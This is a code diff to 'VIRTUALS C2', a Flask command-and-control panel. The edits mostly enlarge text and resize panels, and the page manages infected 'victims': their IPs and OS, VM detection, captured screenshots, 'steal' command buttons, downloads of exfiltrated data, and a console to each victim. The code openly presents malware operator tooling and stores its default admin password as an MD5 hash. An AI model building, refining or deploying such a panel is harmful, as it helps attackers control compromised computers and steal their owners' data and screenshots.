@@ -1,6 +1,6 @@
 """
-VIRTUALS C2 - COMPLETE REDESIGN
-Landing Page · Admin Login · Full Control Panel
+VIRTUALS C2 - PERFECT BALANCE EDITION
+Bigger Text · Smaller Chat Box · All Features
 BY: YOUR STAR BESTIE
 """
 
@@ -65,7 +65,6 @@ def get_db():
         id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT,
         last_login TEXT
     )''')
-    # Create default admin
     c.execute("INSERT OR IGNORE INTO admins (username, password) VALUES (?, ?)",
              (ADMIN_USERNAME, hashlib.md5(ADMIN_PASSWORD.encode()).hexdigest()))
     conn.commit()
@@ -262,7 +261,7 @@ def login_required(f):
     @wraps(f)
     def decorated_function(*args, **kwargs):
         if not session.get('logged_in'):
-            return redirect(url_for('login'))
+            return redirect(url_for('landing'))
         return f(*args, **kwargs)
     return decorated_function
 
@@ -282,22 +281,18 @@ body{background:linear-gradient(135deg,#0a0a0f 0%,#1a0a2e 50%,#0a0a0f 100%);colo
 .login-container h1{color:#e8e8f0;font-size:32px;font-weight:300;text-align:center;letter-spacing:4px;margin-bottom:5px}
 .login-container h1 span{color:#446688}
 .login-container .sub{color:#666680;text-align:center;font-size:14px;margin-bottom:30px}
-.login-container .sub .status{color:#44dd88}
-.login-container label{color:#8888a0;font-size:12px;display:block;margin-bottom:5px;letter-spacing:1px}
-.login-container input{width:100%;padding:12px 16px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);border-radius:8px;color:#e8e8f0;font-size:14px;outline:none;transition:all 0.3s;margin-bottom:15px}
+.login-container label{color:#8888a0;font-size:13px;display:block;margin-bottom:5px;letter-spacing:1px}
+.login-container input{width:100%;padding:14px 18px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);border-radius:8px;color:#e8e8f0;font-size:16px;outline:none;transition:all 0.3s;margin-bottom:15px}
 .login-container input:focus{border-color:rgba(68,170,255,0.4);background:rgba(255,255,255,0.08)}
-.login-container button{width:100%;padding:14px;background:rgba(68,170,255,0.15);border:1px solid rgba(68,170,255,0.2);border-radius:8px;color:#88ccdd;font-size:16px;cursor:pointer;transition:all 0.3s;font-weight:600}
+.login-container button{width:100%;padding:14px;background:rgba(68,170,255,0.15);border:1px solid rgba(68,170,255,0.2);border-radius:8px;color:#88ccdd;font-size:17px;cursor:pointer;transition:all 0.3s;font-weight:600}
 .login-container button:hover{background:rgba(68,170,255,0.25);border-color:rgba(68,170,255,0.4)}
-.login-container .error{color:#cc8888;text-align:center;font-size:13px;margin-top:10px;display:none}
-.login-container .features{margin-top:20px;display:grid;grid-template-columns:1fr 1fr;gap:8px}
-.login-container .features .feat{background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.04);border-radius:6px;padding:8px;text-align:center;font-size:10px;color:#666680}
-.login-container .features .feat span{color:#88aacc}
+.login-container .error{color:#cc8888;text-align:center;font-size:14px;margin-top:10px;display:none}
 </style>
 </head>
 <body>
 <div class="login-container">
 <h1>◈ VIRTUALS <span>C2</span></h1>
-<div class="sub">Control Panel <span class="status">● Online</span></div>
+<div class="sub">Control Panel <span style="color:#44dd88;">● Online</span></div>
 <form id="loginForm" onsubmit="login(event)">
 <label>Username</label>
 <input type="text" id="username" value="admin" required>
@@ -306,12 +301,6 @@ body{background:linear-gradient(135deg,#0a0a0f 0%,#1a0a2e 50%,#0a0a0f 100%);colo
 <button type="submit">Access Control Panel</button>
 <div class="error" id="errorMsg">Invalid credentials</div>
 </form>
-<div class="features">
-<div class="feat"><span>🔐</span> Secure Access</div>
-<div class="feat"><span>📊</span> Real-time Monitoring</div>
-<div class="feat"><span>🕵️</span> Victim Management</div>
-<div class="feat"><span>📦</span> Data Extraction</div>
-</div>
 </div>
 <script>
 function login(e){e.preventDefault();const u=document.getElementById('username').value;const p=document.getElementById('password').value;fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})}).then(r=>r.json()).then(d=>{if(d.success){window.location.href='/dashboard';}else{document.getElementById('errorMsg').style.display='block';}}).catch(()=>{document.getElementById('errorMsg').style.display='block';});}
@@ -321,7 +310,7 @@ function login(e){e.preventDefault();const u=document.getElementById('username')
 '''
 
 # ============================================
-# HTML - DASHBOARD (FULL SCREEN CONTROL PANEL)
+# HTML - DASHBOARD (BIG TEXT, SMALLER CHAT BOX)
 # ============================================
 DASHBOARD = '''<!DOCTYPE html>
 <html>
@@ -331,99 +320,98 @@ DASHBOARD = '''<!DOCTYPE html>
 <title>VIRTUALS C2 - Control Panel</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI','Courier New',monospace;height:100vh;overflow:hidden;font-size:13px}
-::-webkit-scrollbar{width:5px;height:5px}
+body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:100vh;overflow:hidden;font-size:15px}
+::-webkit-scrollbar{width:6px;height:6px}
 ::-webkit-scrollbar-track{background:rgba(255,255,255,0.02)}
 ::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.12);border-radius:3px}
 ::-webkit-scrollbar-thumb:hover{background:rgba(255,255,255,0.25)}
 .glass{background:rgba(10,10,18,0.85);backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,0.08);border-radius:8px}
-.header{background:rgba(10,10,18,0.95);backdrop-filter:blur(12px);padding:6px 16px;border-bottom:1px solid rgba(255,255,255,0.06);display:flex;justify-content:space-between;align-items:center;height:40px;flex-shrink:0}
-.header h1{color:#e8e8f0;font-size:16px;font-weight:300;letter-spacing:2px}
+.header{background:rgba(10,10,18,0.95);backdrop-filter:blur(12px);padding:10px 20px;border-bottom:1px solid rgba(255,255,255,0.06);display:flex;justify-content:space-between;align-items:center;height:50px;flex-shrink:0}
+.header h1{color:#e8e8f0;font-size:22px;font-weight:300;letter-spacing:3px}
 .header h1 span{color:#446688}
-.header .stats{display:flex;gap:12px}
-.header .stats .stat-item{color:#8888a0;font-size:10px}
-.header .stats .stat-item .num{color:#e8e8f0;font-weight:600;font-size:14px;margin-left:3px}
-.header .logout-btn{background:rgba(200,60,60,0.15);color:#cc8888;border:1px solid rgba(200,60,60,0.2);padding:3px 12px;border-radius:4px;cursor:pointer;font-size:11px;transition:all 0.2s}
+.header .stats{display:flex;gap:18px}
+.header .stats .stat-item{color:#8888a0;font-size:14px}
+.header .stats .stat-item .num{color:#e8e8f0;font-weight:600;font-size:18px;margin-left:4px}
+.header .logout-btn{background:rgba(200,60,60,0.15);color:#cc8888;border:1px solid rgba(200,60,60,0.2);padding:5px 16px;border-radius:4px;cursor:pointer;font-size:13px;transition:all 0.2s}
 .header .logout-btn:hover{background:rgba(200,60,60,0.25)}
-.container{display:flex;height:calc(100vh - 40px);padding:4px;gap:4px}
-.left-panel{width:150px;min-width:150px;display:flex;flex-direction:column;gap:4px;height:100%}
-.commands-panel{padding:6px 5px;flex:1;overflow-y:auto}
-.commands-panel .title{color:#666680;font-size:8px;text-transform:uppercase;letter-spacing:2px;text-align:center;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:4px;margin-bottom:4px}
-.cmd-btn{display:block;width:100%;padding:3px 6px;margin:1px 0;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:3px;color:#b0b0c0;font-family:inherit;font-size:10px;cursor:pointer;text-align:left;transition:all 0.15s}
+.container{display:flex;height:calc(100vh - 50px);padding:6px;gap:6px}
+.left-panel{width:180px;min-width:180px;display:flex;flex-direction:column;gap:6px;height:100%}
+.commands-panel{padding:10px 8px;flex:1;overflow-y:auto}
+.commands-panel .title{color:#666680;font-size:11px;text-transform:uppercase;letter-spacing:2px;text-align:center;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:6px;margin-bottom:6px}
+.cmd-btn{display:block;width:100%;padding:6px 10px;margin:2px 0;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:4px;color:#b0b0c0;font-family:inherit;font-size:14px;cursor:pointer;text-align:left;transition:all 0.15s}
 .cmd-btn:hover{background:rgba(255,255,255,0.07);border-color:rgba(255,255,255,0.15);color:#e8e8f0}
-.cmd-btn .desc{color:#555568;font-size:7px;display:block}
-.cmd-btn .icon{font-size:11px;margin-right:3px}
+.cmd-btn .icon{font-size:15px;margin-right:6px}
 .cmd-btn.danger{border-color:rgba(200,60,60,0.25);color:#cc8888}
 .cmd-btn.danger:hover{border-color:rgba(200,60,60,0.45)}
 .cmd-btn.steal{border-color:rgba(50,180,200,0.25);color:#88ccdd}
 .cmd-btn.steal:hover{border-color:rgba(50,180,200,0.45)}
 .cmd-btn.file{border-color:rgba(180,180,50,0.25);color:#ccdd88}
 .cmd-btn.file:hover{border-color:rgba(180,180,50,0.45)}
-.middle-panel{flex:1;display:flex;flex-direction:column;gap:4px;min-width:250px;height:100%}
-.victims-panel{padding:5px 8px;height:22%;overflow:hidden;display:flex;flex-direction:column;flex-shrink:0}
-.victims-panel .title{color:#666680;font-size:8px;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:2px;margin-bottom:3px;flex-shrink:0}
-.victim-list{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:3px;overflow-y:auto;flex:1;align-content:start;padding-right:2px}
-.victim-card{background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:3px;padding:3px 6px;cursor:pointer;transition:all 0.15s}
+.middle-panel{flex:1;display:flex;flex-direction:column;gap:6px;min-width:300px;height:100%}
+.victims-panel{padding:8px 12px;height:25%;overflow:hidden;display:flex;flex-direction:column;flex-shrink:0}
+.victims-panel .title{color:#666680;font-size:11px;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:4px;margin-bottom:6px;flex-shrink:0}
+.victim-list{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:5px;overflow-y:auto;flex:1;align-content:start;padding-right:3px}
+.victim-card{background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:4px;padding:6px 10px;cursor:pointer;transition:all 0.15s}
 .victim-card:hover{background:rgba(255,255,255,0.06);border-color:rgba(255,255,255,0.15)}
 .victim-card.selected{border-color:rgba(80,140,220,0.5);background:rgba(80,140,220,0.08)}
 .victim-card .top{display:flex;justify-content:space-between;align-items:center}
-.victim-card .name{color:#e8e8f0;font-size:11px;font-weight:500;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.victim-card .ip{color:#666680;font-size:8px}
-.victim-card .bottom{display:flex;justify-content:space-between;align-items:center;margin-top:1px}
-.victim-card .status{font-size:8px;display:flex;align-items:center;gap:3px}
-.victim-card .status .dot{display:inline-block;width:4px;height:4px;border-radius:50%;animation:pulse 2s infinite}
+.victim-card .name{color:#e8e8f0;font-size:15px;font-weight:500;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.victim-card .ip{color:#666680;font-size:12px}
+.victim-card .bottom{display:flex;justify-content:space-between;align-items:center;margin-top:2px}
+.victim-card .status{font-size:11px;display:flex;align-items:center;gap:4px}
+.victim-card .status .dot{display:inline-block;width:6px;height:6px;border-radius:50%;animation:pulse 2s infinite}
 .victim-card .status .dot.online{background:#44dd88}
 .victim-card .status .dot.offline{background:#664444;animation:none}
 @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}
-.victim-card .vm-badge{background:rgba(200,60,60,0.15);color:#cc8888;font-size:6px;padding:0 4px;border-radius:6px;line-height:12px;height:12px}
-.chat-panel{padding:5px 8px;flex:1;display:flex;flex-direction:column;min-height:0}
-.chat-panel .title{color:#666680;font-size:8px;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:2px;margin-bottom:3px;flex-shrink:0}
-.chat-messages{background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.05);border-radius:4px;padding:4px 6px;flex:1;overflow-y:auto;min-height:80px;font-size:12px;line-height:1.5}
+.victim-card .vm-badge{background:rgba(200,60,60,0.15);color:#cc8888;font-size:9px;padding:0 6px;border-radius:8px;line-height:14px;height:14px}
+.chat-panel{padding:8px 12px;height:45%;display:flex;flex-direction:column;flex-shrink:0}
+.chat-panel .title{color:#666680;font-size:11px;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:4px;margin-bottom:6px;flex-shrink:0}
+.chat-messages{background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.05);border-radius:5px;padding:6px 10px;flex:1;overflow-y:auto;min-height:60px;max-height:100px;font-size:14px;line-height:1.6}
 .chat-messages .msg{padding:1px 0}
-.chat-messages .time{color:#555568;margin-right:4px;font-size:9px}
-.chat-messages .sender{font-weight:600}
+.chat-messages .time{color:#555568;margin-right:6px;font-size:12px}
+.chat-messages .sender{font-weight:600;font-size:14px}
 .chat-messages .sender.us{color:#66ddbb}
 .chat-messages .sender.victim{color:#ddbb88}
 .chat-messages .sender.system{color:#8888aa}
 .chat-messages .sender.embed{color:#ffd700}
-.chat-input-area{display:flex;gap:3px;margin-top:3px;flex-shrink:0}
-.chat-input-area input{flex:1;padding:4px 8px;background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:4px;color:#c8c8d0;font-family:inherit;font-size:12px;outline:none;min-height:28px}
+.chat-input-area{display:flex;gap:5px;margin-top:5px;flex-shrink:0}
+.chat-input-area input{flex:1;padding:8px 14px;background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:5px;color:#c8c8d0;font-family:inherit;font-size:15px;outline:none;min-height:36px}
 .chat-input-area input:focus{border-color:rgba(255,255,255,0.15)}
-.chat-input-area input::placeholder{color:#444458;font-size:10px}
-.chat-input-area button{padding:4px 12px;background:rgba(255,255,255,0.05);color:#b0b0c0;border:1px solid rgba(255,255,255,0.08);border-radius:4px;cursor:pointer;font-family:inherit;font-size:11px;transition:all 0.15s}
+.chat-input-area input::placeholder{color:#444458;font-size:13px}
+.chat-input-area button{padding:8px 18px;background:rgba(255,255,255,0.05);color:#b0b0c0;border:1px solid rgba(255,255,255,0.08);border-radius:5px;cursor:pointer;font-family:inherit;font-size:15px;transition:all 0.15s}
 .chat-input-area button:hover{background:rgba(255,255,255,0.1);border-color:rgba(255,255,255,0.18);color:#e8e8f0}
-.file-upload-area{display:flex;gap:3px;margin-top:2px;flex-shrink:0;flex-wrap:wrap;align-items:center}
-.file-upload-area input[type="file"]{flex:1;padding:2px 6px;background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:3px;color:#c8c8d0;font-size:10px;min-width:50px}
-.file-upload-area button{padding:2px 10px;background:rgba(50,180,200,0.12);color:#88ccdd;border:1px solid rgba(50,180,200,0.2);border-radius:3px;cursor:pointer;font-size:10px;transition:all 0.15s}
+.file-upload-area{display:flex;gap:5px;margin-top:4px;flex-shrink:0;flex-wrap:wrap;align-items:center}
+.file-upload-area input[type="file"]{flex:1;padding:4px 10px;background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:4px;color:#c8c8d0;font-size:13px;min-width:60px}
+.file-upload-area button{padding:4px 14px;background:rgba(50,180,200,0.12);color:#88ccdd;border:1px solid rgba(50,180,200,0.2);border-radius:4px;cursor:pointer;font-size:13px;transition:all 0.15s}
 .file-upload-area button:hover{background:rgba(50,180,200,0.22)}
-.file-upload-area #fileName{color:#555568;font-size:9px;max-width:70px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.upload-progress{width:100%;height:2px;background:rgba(255,255,255,0.05);border-radius:1px;margin-top:2px;overflow:hidden;display:none}
+.file-upload-area #fileName{color:#555568;font-size:12px;max-width:80px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.upload-progress{width:100%;height:3px;background:rgba(255,255,255,0.05);border-radius:2px;margin-top:3px;overflow:hidden;display:none}
 .upload-progress .bar{height:100%;background:linear-gradient(90deg,#44dd88,#88ccdd);width:0%;transition:width 0.3s}
-.activity-monitor{background:rgba(0,0,0,0.25);border:1px solid rgba(255,255,255,0.04);border-radius:3px;padding:2px 5px;margin-top:2px;flex-shrink:0;max-height:35px;overflow-y:auto}
-.activity-monitor .title{color:#666680;font-size:6px;text-transform:uppercase;letter-spacing:1px;margin-bottom:1px}
-.activity-item{display:flex;justify-content:space-between;font-size:7px;padding:1px 0;border-bottom:1px solid rgba(255,255,255,0.02)}
+.activity-monitor{background:rgba(0,0,0,0.25);border:1px solid rgba(255,255,255,0.04);border-radius:4px;padding:4px 8px;margin-top:4px;flex-shrink:0;max-height:45px;overflow-y:auto}
+.activity-monitor .title{color:#666680;font-size:9px;text-transform:uppercase;letter-spacing:1px;margin-bottom:2px}
+.activity-item{display:flex;justify-content:space-between;font-size:10px;padding:1px 0;border-bottom:1px solid rgba(255,255,255,0.02)}
 .activity-item .act-pc{color:#88aacc;font-weight:500}
 .activity-item .act-action{color:#8888aa}
-.activity-item .act-time{color:#444458;font-size:6px}
-.right-panel{width:230px;min-width:230px;display:flex;flex-direction:column;gap:4px;height:100%}
-.details-panel{padding:5px 8px;height:40%;overflow-y:auto;flex-shrink:0}
-.details-panel .title{color:#666680;font-size:8px;text-transform:uppercase;letter-spacing:2px;text-align:center;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:2px;margin-bottom:2px}
-.detail-item{padding:2px 0;border-bottom:1px solid rgba(255,255,255,0.02);font-size:10px;display:flex;justify-content:space-between}
-.detail-item .label{color:#555568}
-.detail-item .value{color:#e8e8f0;font-weight:500}
-.screenshot-gallery{display:flex;flex-wrap:wrap;gap:2px;margin-top:2px}
-.screenshot-thumb{width:42px;height:30px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:3px;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:7px;color:#555568;transition:all 0.15s}
+.activity-item .act-time{color:#444458;font-size:9px}
+.right-panel{width:280px;min-width:280px;display:flex;flex-direction:column;gap:6px;height:100%}
+.details-panel{padding:8px 12px;height:42%;overflow-y:auto;flex-shrink:0}
+.details-panel .title{color:#666680;font-size:11px;text-transform:uppercase;letter-spacing:2px;text-align:center;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:4px;margin-bottom:4px}
+.detail-item{padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.02);font-size:14px;display:flex;justify-content:space-between}
+.detail-item .label{color:#555568;font-size:13px}
+.detail-item .value{color:#e8e8f0;font-weight:500;font-size:14px}
+.screenshot-gallery{display:flex;flex-wrap:wrap;gap:4px;margin-top:4px}
+.screenshot-thumb{width:55px;height:40px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:4px;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:10px;color:#555568;transition:all 0.15s}
 .screenshot-thumb:hover{border-color:rgba(255,255,255,0.15)}
-.download-section{padding:3px 0;border-top:1px solid rgba(255,255,255,0.04);margin-top:3px;display:flex;flex-direction:column;gap:2px}
-.download-section .label{color:#666680;font-size:7px;text-transform:uppercase;letter-spacing:1px}
-.download-btn{background:rgba(50,180,120,0.15);color:#66ddbb;border:1px solid rgba(50,180,120,0.2);padding:4px 10px;border-radius:3px;cursor:pointer;font-size:10px;transition:all 0.15s;text-align:center}
+.download-section{padding:4px 0;border-top:1px solid rgba(255,255,255,0.04);margin-top:4px;display:flex;flex-direction:column;gap:3px}
+.download-section .label{color:#666680;font-size:10px;text-transform:uppercase;letter-spacing:1px}
+.download-btn{background:rgba(50,180,120,0.15);color:#66ddbb;border:1px solid rgba(50,180,120,0.2);padding:6px 14px;border-radius:4px;cursor:pointer;font-size:14px;transition:all 0.15s;text-align:center}
 .download-btn:hover{background:rgba(50,180,120,0.25)}
-.download-zip-btn{background:rgba(50,180,200,0.15);color:#88ccdd;border:1px solid rgba(50,180,200,0.2);padding:4px 10px;border-radius:3px;cursor:pointer;font-size:10px;transition:all 0.15s;text-align:center}
+.download-zip-btn{background:rgba(50,180,200,0.15);color:#88ccdd;border:1px solid rgba(50,180,200,0.2);padding:6px 14px;border-radius:4px;cursor:pointer;font-size:14px;transition:all 0.15s;text-align:center}
 .download-zip-btn:hover{background:rgba(50,180,200,0.25)}
-.logs-panel{padding:5px 8px;flex:1;overflow-y:auto;min-height:0}
-.logs-panel .title{color:#666680;font-size:8px;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:2px;margin-bottom:2px}
-.log-item{padding:1px 0;border-bottom:1px solid rgba(255,255,255,0.02);font-size:9px;display:flex;gap:3px;opacity:0.9}
-.log-item .type{padding:0 3px;border-radius:2px;font-size:6px;text-transform:uppercase;flex-shrink:0;font-weight:600;margin-top:1px}
+.logs-panel{padding:8px 12px;flex:1;overflow-y:auto;min-height:0}
+.logs-panel .title{color:#666680;font-size:11px;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid rgba(255,255,255,0.04);padding-bottom:4px;margin-bottom:4px}
+.log-item{padding:2px 0;border-bottom:1px solid rgba(255,255,255,0.02);font-size:12px;display:flex;gap:5px;opacity:0.9}
+.log-item .type{padding:1px 5px;border-radius:3px;font-size:8px;text-transform:uppercase;flex-shrink:0;font-weight:600;margin-top:1px}
 .log-item .type.success{background:rgba(50,180,120,0.2);color:#66ddbb}
 .log-item .type.failed{background:rgba(180,50,50,0.2);color:#cc8888}
 .log-item .type.steal{background:rgba(50,180,200,0.2);color:#88ccdd}
@@ -431,13 +419,14 @@ body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI','Courier New',monos
 .log-item .type.embed{background:rgba(255,215,0,0.15);color:#ffd700}
 .log-item .type.info{background:rgba(68,170,255,0.15);color:#44aaff}
 .log-item .type.system{background:rgba(136,136,170,0.15);color:#8888aa}
-.log-item .log-time{color:#444458;font-size:7px;flex-shrink:0}
-.log-item .log-content{color:#b0b0c0;word-break:break-word;font-size:9px}
-.embed-box{background:rgba(0,0,0,0.25);border-left:3px solid var(--embed-color,#44aaff);border-radius:3px;padding:4px 6px;margin:2px 0}
-.embed-box .embed-title{font-size:12px;font-weight:600;color:#e8e8f0}
-.embed-box .embed-content{font-size:10px;color:#b0b0c0;margin-top:1px;white-space:pre-wrap}
-.embed-box .embed-footer{font-size:8px;color:#555568;margin-top:1px}
-@media(max-width:768px){.left-panel{width:100px;min-width:100px}.right-panel{width:160px;min-width:160px}.victim-list{grid-template-columns:repeat(auto-fill,minmax(80px,1fr))}}
+.log-item .log-time{color:#444458;font-size:10px;flex-shrink:0}
+.log-item .log-content{color:#b0b0c0;word-break:break-word;font-size:12px}
+.embed-box{background:rgba(0,0,0,0.25);border-left:4px solid var(--embed-color,#44aaff);border-radius:4px;padding:6px 10px;margin:3px 0}
+.embed-box .embed-title{font-size:15px;font-weight:600;color:#e8e8f0}
+.embed-box .embed-content{font-size:13px;color:#b0b0c0;margin-top:2px;white-space:pre-wrap}
+.embed-box .embed-footer{font-size:11px;color:#555568;margin-top:2px}
+@media(max-width:1024px){.left-panel{width:150px;min-width:150px}.right-panel{width:220px;min-width:220px}}
+@media(max-width:768px){.left-panel{width:100px;min-width:100px}.right-panel{width:160px;min-width:160px}.victim-list{grid-template-columns:repeat(auto-fill,minmax(100px,1fr))}}
 </style>
 </head>
 <body>
@@ -472,7 +461,7 @@ body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI','Courier New',monos
 <div class="middle-panel">
 <div class="victims-panel glass">
 <div class="title">🎯 Victims</div>
-<div class="victim-list" id="victimList"><div style="color:#555568;font-size:11px;text-align:center;padding:8px;">No victims</div></div>
+<div class="victim-list" id="victimList"><div style="color:#555568;font-size:14px;text-align:center;padding:10px;">No victims</div></div>
 </div>
 <div class="chat-panel glass">
 <div class="title">💬 Console</div>
@@ -486,17 +475,17 @@ body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI','Courier New',monos
 <div class="upload-progress" id="uploadProgress"><div class="bar" id="progressBar"></div></div>
 <div class="activity-monitor" id="activityMonitor">
 <div class="title">🔄 Victim Activity</div>
-<div id="activityList"><div style="color:#444458;font-size:8px;">no activity</div></div>
+<div id="activityList"><div style="color:#444458;font-size:10px;">no activity</div></div>
 </div>
 </div>
 </div>
 <div class="right-panel">
 <div class="details-panel glass">
 <div class="title">📋 Victim Details</div>
-<div id="victimDetails"><div style="color:#555568;font-size:11px;text-align:center;padding:10px;">select a victim</div></div>
-<div style="margin-top:2px;border-top:1px solid rgba(255,255,255,0.04);padding-top:2px;">
-<div style="color:#666680;font-size:7px;text-transform:uppercase;">📸 Screenshots</div>
-<div class="screenshot-gallery" id="screenshotGallery"><div style="color:#555568;font-size:9px;">none</div></div>
+<div id="victimDetails"><div style="color:#555568;font-size:14px;text-align:center;padding:12px;">select a victim</div></div>
+<div style="margin-top:4px;border-top:1px solid rgba(255,255,255,0.04);padding-top:4px;">
+<div style="color:#666680;font-size:10px;text-transform:uppercase;">📸 Screenshots</div>
+<div class="screenshot-gallery" id="screenshotGallery"><div style="color:#555568;font-size:12px;">none</div></div>
 </div>
 <div class="download-section">
 <div class="label">⬇️ Downloads</div>
@@ -506,7 +495,7 @@ body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI','Courier New',monos
 </div>
 <div class="logs-panel glass">
 <div class="title">📊 Logs</div>
-<div id="logOutput"><div style="color:#555568;font-size:10px;">no logs</div></div>
+<div id="logOutput"><div style="color:#555568;font-size:13px;">no logs</div></div>
 </div>
 </div>
 </div>
@@ -516,17 +505,17 @@ let state={victims:{},selectedVictim:null,commands:{},cmdCount:0,logCount:0};
 function logout(){fetch('/api/logout',{method:'POST'}).then(()=>{window.location.href='/';});}
 function api(a,d,c){fetch('/api',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:a,...d})}).then(r=>r.json()).then(c).catch(()=>{});}
 function refresh(){api('getVictims',{},d=>{if(d.success){state.victims=d.victims;render();update();updateActivity();}});}
-function render(){const el=document.getElementById('victimList');const v=Object.values(state.victims);if(v.length===0){el.innerHTML='<div style="color:#555568;font-size:11px;text-align:center;padding:8px;">No victims</div>';return;}el.innerHTML=v.map(v=>`<div class="victim-card ${state.selectedVictim===v.id?'selected':''}" onclick="select('${v.id}')"><div class="top"><span class="name">${v.pc}</span><span class="ip">${v.ip}</span></div><div class="bottom"><span class="status"><span class="dot ${v.status==='Online'?'online':'offline'}"></span>${v.status}</span>${v.is_vm?'<span class="vm-badge">VM</span>':''}</div></div>`).join('');}
+function render(){const el=document.getElementById('victimList');const v=Object.values(state.victims);if(v.length===0){el.innerHTML='<div style="color:#555568;font-size:14px;text-align:center;padding:10px;">No victims</div>';return;}el.innerHTML=v.map(v=>`<div class="victim-card ${state.selectedVictim===v.id?'selected':''}" onclick="select('${v.id}')"><div class="top"><span class="name">${v.pc}</span><span class="ip">${v.ip}</span></div><div class="bottom"><span class="status"><span class="dot ${v.status==='Online'?'online':'offline'}"></span>${v.status}</span>${v.is_vm?'<span class="vm-badge">VM</span>':''}</div></div>`).join('');}
 function select(id){state.selectedVictim=id;render();show(id);loadSS(id);}
-function show(id){const v=state.victims[id];if(!v)return;document.getElementById('victimDetails').innerHTML=`<div class="detail-item"><span class="label">ID</span><span class="value">${v.id}</span></div><div class="detail-item"><span class="label">PC</span><span class="value">${v.pc}</span></div><div class="detail-item"><span class="label">IP</span><span class="value">${v.ip}</span></div><div class="detail-item"><span class="label">OS</span><span class="value">${v.os||'unknown'}</span></div><div class="detail-item"><span class="label">Status</span><span class="value" style="color:${v.status==='Online'?'#66dd88':'#886666'}">${v.status}</span></div><div class="detail-item"><span class="label">VM</span><span class="value" style="color:${v.is_vm?'#cc8888':'#66dd88'}">${v.is_vm?'⚠️ detected':'✅ clean'}</span></div><div class="detail-item"><span class="label">Commands</span><span class="value">${(state.commands[id]||[]).length}</span></div>`;}
-function loadSS(id){api('getScreenshots',{victim_id:id},d=>{const el=document.getElementById('screenshotGallery');if(!d.success||!d.screenshots||d.screenshots.length===0){el.innerHTML='<div style="color:#555568;font-size:9px;">none</div>';return;}el.innerHTML=d.screenshots.map(s=>`<div class="screenshot-thumb" onclick="window.open('/screenshots/${s.filename}','_blank')">📷</div>`).join('');});}
+function show(id){const v=state.victims[id];if(!v)return;document.getElementById('victimDetails').innerHTML=`<div class="detail-item"><span class="label">ID</span><span class="value">${v.id}</span></div><div class="detail-item"><span class="label">PC</span><span class="value">${v.pc}</span></div><div class="detail-item"><span class="label">IP</span><span class="value">${v.ip}</span></div><div class="detail-item"><span class="label">OS</span><span class="value">${v.os||'unknown'}</span></div><div class="detail-item"><span class="label">Status</span><span class="value" style="color:${v.status==='Online'?'#66dd88':'#886666'}">${v.status}</span></div><div class="detail-item"><span class="label">VM</span><span class="value" style="color:${v.is_vm?'#cc8888':'#66dd88'}">${v.is_vm?'⚠ detected':'✅ clean'}</span></div><div class="detail-item"><span class="label">Commands</span><span class="value">${(state.commands[id]||[]).length}</span></div>`;}
+function loadSS(id){api('getScreenshots',{victim_id:id},d=>{const el=document.getElementById('screenshotGallery');if(!d.success||!d.screenshots||d.screenshots.length===0){el.innerHTML='<div style="color:#555568;font-size:12px;">none</div>';return;}el.innerHTML=d.screenshots.map(s=>`<div class="screenshot-thumb" onclick="window.open('/screenshots/${s.filename}','_blank')">📷</div>`).join('');});}
 function update(){const v=Object.values(state.victims);document.getElementById('victimCount').textContent=v.length;document.getElementById('onlineCount').textContent=v.filter(x=>x.status==='Online').length;document.getElementById('vmCount').textContent=v.filter(x=>x.is_vm).length;document.getElementById('logCount').textContent=state.logCount;}
